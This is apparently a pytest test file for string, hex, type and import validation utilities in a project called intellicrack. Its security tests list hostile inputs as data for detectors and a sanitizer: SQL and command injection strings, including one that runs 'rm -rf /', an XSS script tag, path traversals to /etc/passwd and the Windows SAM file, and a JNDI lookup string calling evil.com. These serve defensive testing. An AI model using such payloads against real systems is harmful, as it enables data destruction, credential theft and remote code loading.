import pytest
import re
import unicodedata
import string
import random
from typing import Dict, List, Any

from intellicrack.utils.core.string_utils import StringUtils
from intellicrack.utils.core.type_validation import TypeValidator
from intellicrack.utils.binary.hex_utils import HexUtils
from intellicrack.utils.validation.import_validator import ImportValidator
from intellicrack.core.app_context import AppContext


class TestRealStringAndValidation:
    """Functional tests for REAL string manipulation and validation operations."""

    @pytest.fixture
    def app_context(self):
        """Create REAL application context."""
        context = AppContext()
        context.initialize()
        return context

    @pytest.fixture
    def test_strings(self):
        """REAL test strings with various formats."""
        return {
            'ascii': 'Hello World 123!',
            'unicode': 'Hello 世界 🌍 Ñiño',
            'mixed_case': 'MiXeD cAsE sTrInG',
            'special_chars': '!@#$%^&*()_+-=[]{}|;:",.<>?',
            'whitespace': '  \t\n\r  Test String  \t\n\r  ',
            'empty': '',
            'long': 'A' * 1000,
            'hex_string': '48656c6c6f20576f726c64',
            'base64': 'SGVsbG8gV29ybGQ=',
            'json_like': '{"name": "test", "value": 123}',
            'xml_like': '<tag attribute="value">content</tag>',
            'sql_like': "SELECT * FROM users WHERE id = 'test'",
            'path_like': r'C:\Windows\System32\notepad.exe',
            'url_like': 'https://example.com/path?param=value',
            'email_like': 'test@example.com',
            'phone_like': '+1-555-123-4567',
            'uuid_like': '123e4567-e89b-12d3-a456-426614174000',
            'binary_string': '\x00\x01\x02\x03\xFF\xFE\xFD',
            'malformed_utf8': b'\xff\xfe\xfd\xfc'.decode('latin1')
        }

    def test_real_string_manipulation_operations(self, test_strings, app_context):
        """Test REAL string manipulation functions."""
        string_utils = StringUtils()
        
        # Test cleaning operations
        for name, test_string in test_strings.items():
            # Clean whitespace
            cleaned = string_utils.clean_whitespace(test_string)
            assert cleaned is not None, f"Whitespace cleaning failed for {name}"
            
            if name == 'whitespace':
                assert cleaned.strip() == 'Test String', "Whitespace should be cleaned"
            
            # Normalize unicode
            normalized = string_utils.normalize_unicode(test_string)
            assert normalized is not None, f"Unicode normalization failed for {name}"
            
            if name == 'unicode':
                # Check if normalization worked
                assert len(normalized) > 0, "Normalized string should not be empty"
        
        # Test case operations
        for case_type in ['upper', 'lower', 'title', 'capitalize']:
            result = string_utils.change_case(test_strings['mixed_case'], case_type)
            assert result is not None, f"Case change to {case_type} must work"
            
            if case_type == 'upper':
                assert result.isupper(), "Upper case conversion must work"
            elif case_type == 'lower':
                assert result.islower(), "Lower case conversion must work"
        
        # Test string splitting
        split_result = string_utils.smart_split(
            "word1,word2;word3|word4 word5",
            delimiters=[',', ';', '|', ' ']
        )
        assert len(split_result) == 5, "Smart split must find all words"
        assert split_result == ['word1', 'word2', 'word3', 'word4', 'word5']
        
        # Test string joining
        join_result = string_utils.smart_join(
            ['hello', 'world', 'test'],
            separator=' ',
            last_separator=' and '
        )
        assert join_result == 'hello, world and test', "Smart join must format correctly"

    def test_real_string_encoding_operations(self, test_strings, app_context):
        """Test REAL string encoding and decoding."""
        string_utils = StringUtils()
        
        test_string = test_strings['unicode']
        
        # Test various encodings
        encodings = ['utf-8', 'utf-16', 'latin1', 'ascii']
        
        for encoding in encodings:
            try:
                # Encode
                encoded = string_utils.safe_encode(test_string, encoding)
                assert encoded is not None, f"Encoding to {encoding} must work"
                
                # Decode
                decoded = string_utils.safe_decode(encoded, encoding)
                assert decoded is not None, f"Decoding from {encoding} must work"
                
                if encoding in ['utf-8', 'utf-16']:
                    assert decoded == test_string, f"Round-trip for {encoding} must preserve content"
                
            except UnicodeError:
                # Some encodings may not support all characters
                if encoding == 'ascii':
                    # ASCII limitation is expected for unicode string
                    pass
                else:
                    raise
        
        # Test base64 operations
        base64_encoded = string_utils.encode_base64(test_string)
        assert base64_encoded is not None, "Base64 encoding must work"
        
        base64_decoded = string_utils.decode_base64(base64_encoded)
        assert base64_decoded == test_string, "Base64 round-trip must preserve content"
        
        # Test URL encoding
        url_encoded = string_utils.url_encode(test_strings['url_like'])
        assert url_encoded is not None, "URL encoding must work"
        
        url_decoded = string_utils.url_decode(url_encoded)
        assert url_decoded == test_strings['url_like'], "URL round-trip must preserve content"

    def test_real_hex_utilities(self, app_context):
        """Test REAL hexadecimal utilities."""
        hex_utils = HexUtils()
        
        # Test data
        binary_data = b'\x00\x01\x0f\x10\xff\xfe\xab\xcd\xef'
        hex_string = '00010f10fffeabcdef'
        
        # Binary to hex
        hex_result = hex_utils.binary_to_hex(binary_data)
        assert hex_result == hex_string, "Binary to hex conversion must be correct"
        
        # Hex to binary
        binary_result = hex_utils.hex_to_binary(hex_string)
        assert binary_result == binary_data, "Hex to binary conversion must be correct"
        
        # Test with spacing
        spaced_hex = hex_utils.format_hex(binary_data, spacing=2)
        assert spaced_hex == '00 01 0f 10 ff fe ab cd ef', "Spaced hex must be formatted correctly"
        
        # Test hex validation
        valid_hex_strings = ['0123456789abcdef', 'ABCDEF', '00', 'ff']
        invalid_hex_strings = ['xyz', '0g', 'hello', '0x123']
        
        for valid_hex in valid_hex_strings:
            assert hex_utils.is_valid_hex(valid_hex), f"{valid_hex} should be valid hex"
        
        for invalid_hex in invalid_hex_strings:
            assert not hex_utils.is_valid_hex(invalid_hex), f"{invalid_hex} should be invalid hex"
        
        # Test hex arithmetic
        hex1 = '0f'
        hex2 = '10'
        
        add_result = hex_utils.hex_add(hex1, hex2)
        assert add_result == '1f', "Hex addition must work correctly"
        
        xor_result = hex_utils.hex_xor(hex1, hex2)
        assert xor_result == '1f', "Hex XOR must work correctly"
        
        # Test endianness conversion
        little_endian = hex_utils.swap_endianness('12345678')
        assert little_endian == '78563412', "Endianness swap must work correctly"

    def test_real_type_validation(self, app_context):
        """Test REAL type validation operations."""
        validator = TypeValidator()
        
        # Test basic type validation
        validation_tests = [
            (42, int, True),
            ('hello', str, True),
            (3.14, float, True),
            ([1, 2, 3], list, True),
            ({'key': 'value'}, dict, True),
            (42, str, False),
            ('hello', int, False),
            (None, str, False)
        ]
        
        for value, expected_type, should_pass in validation_tests:
            result = validator.validate_type(value, expected_type)
            assert result == should_pass, f"Type validation for {value} as {expected_type} failed"
        
        # Test complex type validation
        complex_types = {
            'list_of_strings': ([str], ['hello', 'world']),
            'dict_with_string_keys': ({str: int}, {'a': 1, 'b': 2}),
            'nested_structure': ({str: [int]}, {'numbers': [1, 2, 3]})
        }
        
        for type_name, (type_spec, test_value) in complex_types.items():
            result = validator.validate_complex_type(test_value, type_spec)
            assert result['valid'], f"Complex type validation failed for {type_name}"
        
        # Test range validation
        range_tests = [
            (5, 1, 10, True),
            (0, 1, 10, False),
            (15, 1, 10, False),
            (1, 1, 10, True),
            (10, 1, 10, True)
        ]
        
        for value, min_val, max_val, should_pass in range_tests:
            result = validator.validate_range(value, min_val, max_val)
            assert result == should_pass, f"Range validation for {value} in [{min_val}, {max_val}] failed"
        
        # Test format validation
        format_tests = [
            ('test@example.com', 'email', True),
            ('invalid-email', 'email', False),
            ('https://example.com', 'url', True),
            ('not-a-url', 'url', False),
            ('123-45-6789', 'phone', True),
            ('invalid-phone', 'phone', False)
        ]
        
        for value, format_type, should_pass in format_tests:
            result = validator.validate_format(value, format_type)
            assert result == should_pass, f"Format validation for {value} as {format_type} failed"

    def test_real_pattern_matching(self, test_strings, app_context):
        """Test REAL pattern matching operations."""
        string_utils = StringUtils()
        
        # Test regex patterns
        patterns = {
            'email': r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$',
            'phone': r'^\+?[\d\s\-\(\)]{10,}$',
            'uuid': r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$',
            'hex': r'^[0-9a-fA-F]+$',
            'url': r'^https?://[^\s]+$'
        }
        
        # Test pattern matching
        for pattern_name, pattern in patterns.items():
            test_string = test_strings.get(f'{pattern_name}_like', '')
            if test_string:
                match_result = string_utils.match_pattern(test_string, pattern)
                assert match_result is not None, f"Pattern {pattern_name} should match"
                assert match_result['matched'], f"Pattern {pattern_name} should match test string"
        
        # Test multiple pattern extraction
        text = "Contact us at test@example.com or call +1-555-123-4567"
        extractions = string_utils.extract_patterns(text, {
            'emails': patterns['email'],
            'phones': patterns['phone']
        })
        
        assert 'emails' in extractions, "Should extract emails"
        assert 'phones' in extractions, "Should extract phones"
        assert len(extractions['emails']) == 1, "Should find one email"
        assert len(extractions['phones']) == 1, "Should find one phone"
        
        # Test fuzzy matching
        fuzzy_result = string_utils.fuzzy_match('hello world', 'helo wrold')
        assert fuzzy_result is not None, "Fuzzy match must return result"
        assert fuzzy_result['similarity'] > 0.7, "Similar strings should have high similarity"

    def test_real_string_security_validation(self, app_context):
        """Test REAL string security validation."""
        string_utils = StringUtils()
        
        # Test injection detection
        injection_tests = [
            ("'; DROP TABLE users; --", 'sql', True),
            ("<script>alert('xss')</script>", 'xss', True),
            ("'; system('rm -rf /'); --", 'command', True),
            ("normal text", 'any', False),
            ("user@example.com", 'any', False)
        ]
        
        for test_string, injection_type, should_detect in injection_tests:
            result = string_utils.detect_injection(test_string, injection_type)
            assert result['detected'] == should_detect, \
                f"Injection detection failed for {test_string}"
        
        # Test sanitization
        dangerous_strings = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/exploit}"
        ]
        
        for dangerous in dangerous_strings:
            sanitized = string_utils.sanitize_string(dangerous)
            assert sanitized != dangerous, "Dangerous strings must be sanitized"
            assert '<script>' not in sanitized, "Script tags should be removed"
            assert 'DROP TABLE' not in sanitized, "SQL commands should be neutralized"
        
        # Test path traversal detection
        path_tests = [
            ("../../../etc/passwd", True),
            ("..\\..\\..\\windows\\system32\\config\\sam", True),
            ("normal/path/file.txt", False),
            ("./current/dir/file.txt", False)
        ]
        
        for path, should_detect in path_tests:
            result = string_utils.detect_path_traversal(path)
            assert result == should_detect, f"Path traversal detection failed for {path}"

    def test_real_import_validation(self, app_context):
        """Test REAL import validation."""
        validator = ImportValidator()
        
        # Test safe imports
        safe_imports = ['os', 'sys', 'json', 'datetime', 'pathlib']
        
        for module_name in safe_imports:
            result = validator.validate_import(module_name)
            assert result is not None, f"Import validation for {module_name} must work"
            assert result['safe'], f"{module_name} should be considered safe"
        
        # Test potentially dangerous imports
        dangerous_imports = ['subprocess', 'eval', 'exec', '__import__']
        
        for module_name in dangerous_imports:
            result = validator.validate_import(module_name)
            if result:  # Some may not be testable
                assert not result.get('safe', True), f"{module_name} should be flagged as unsafe"
        
        # Test import path validation
        import_paths = [
            ("intellicrack.utils.string_utils", True),
            ("os.path", True),
            ("../../../malicious/module", False),
            ("legitimate.module.name", True)
        ]
        
        for import_path, should_be_safe in import_paths:
            result = validator.validate_import_path(import_path)
            if result:
                assert result['safe'] == should_be_safe, \
                    f"Import path validation failed for {import_path}"

    def test_real_text_analysis(self, test_strings, app_context):
        """Test REAL text analysis operations."""
        string_utils = StringUtils()
        
        # Analyze different string types
        for name, test_string in test_strings.items():
            analysis = string_utils.analyze_text(test_string)
            assert analysis is not None, f"Text analysis failed for {name}"
            assert 'length' in analysis, "Analysis must include length"
            assert 'char_count' in analysis, "Analysis must include character count"
            assert 'encoding_info' in analysis, "Analysis must include encoding info"
            
            # Verify basic metrics
            assert analysis['length'] == len(test_string), "Length must be correct"
            
            if test_string:
                assert analysis['char_count'] > 0, "Non-empty strings must have character count"
        
        # Test complexity analysis
        complexity_tests = [
            ('simple', 'low'),
            ('Moderately_Complex_String_123!', 'medium'),
            ('VeryComplexString!@#$%^&*()_+{}|:<>?[]\\;",./`~', 'high')
        ]
        
        for test_string, expected_complexity in complexity_tests:
            complexity = string_utils.analyze_complexity(test_string)
            assert complexity is not None, f"Complexity analysis failed for {test_string}"
            assert 'level' in complexity, "Must have complexity level"
            assert 'score' in complexity, "Must have complexity score"
        
        # Test language detection
        multilingual_texts = {
            'english': 'This is an English sentence.',
            'spanish': 'Esta es una oración en español.',
            'chinese': '这是一个中文句子。',
            'mixed': 'Hello 世界 Bonjour monde'
        }
        
        for lang, text in multilingual_texts.items():
            lang_result = string_utils.detect_language(text)
            if lang_result:  # Language detection may not work for all cases
                assert 'detected_language' in lang_result, "Must detect language"
                assert 'confidence' in lang_result, "Must have confidence score"

    def test_real_performance_string_operations(self, app_context):
        """Test REAL performance of string operations."""
        string_utils = StringUtils()
        
        # Generate large test data
        large_text = 'Test string ' * 10000
        large_list = ['item'] * 10000
        
        # Test performance of various operations
        import time
        
        # String joining performance
        start_time = time.time()
        joined = string_utils.efficient_join(large_list, ' ')
        join_time = time.time() - start_time
        
        assert joined is not None, "Efficient join must work"
        assert join_time < 1.0, "Join operation should complete quickly"
        
        # String splitting performance
        start_time = time.time()
        split_result = string_utils.efficient_split(large_text, ' ')
        split_time = time.time() - start_time
        
        assert split_result is not None, "Efficient split must work"
        assert split_time < 1.0, "Split operation should complete quickly"
        assert len(split_result) > 0, "Split must produce results"
        
        # Pattern matching performance
        pattern = r'\bTest\b'
        start_time = time.time()
        matches = string_utils.fast_pattern_search(large_text, pattern)
        search_time = time.time() - start_time
        
        assert matches is not None, "Fast pattern search must work"
        assert search_time < 1.0, "Pattern search should complete quickly"
        assert len(matches) > 0, "Should find matches in large text"